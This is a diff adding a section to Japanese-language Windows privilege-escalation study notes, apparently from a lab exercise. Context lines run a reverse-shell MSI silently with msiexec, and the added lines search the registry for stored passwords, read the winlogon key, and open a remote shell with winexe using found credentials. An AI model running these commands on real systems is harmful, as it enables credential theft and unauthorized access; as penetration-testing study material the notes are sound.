@@ -52,6 +52,16 @@ reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallEle
 msi ベースのリバースシェルを実行 (ダブルクリックでも良いが、以下だと UI が出ない。）
 msiexec /quiet /qn /i C:\PrivEsc\reverse.msi
 
+【4. レジストリ内の情報】
+・方法
+「password」キーワードでレジストリを検索する。
+reg query HKLM /f password /t REG_SZ /s
+reg query HKCU /f password /t REG_SZ /s
+
+reg query "HKLM\Software\Microsoft\Windows NT\CurrentVersion\winlogon"
+
+以下のコマンドで、リモートで shell 接続できる。
+winexe -U 'admin%password123' //10.10.136.203 cmd.exe
 
 
 
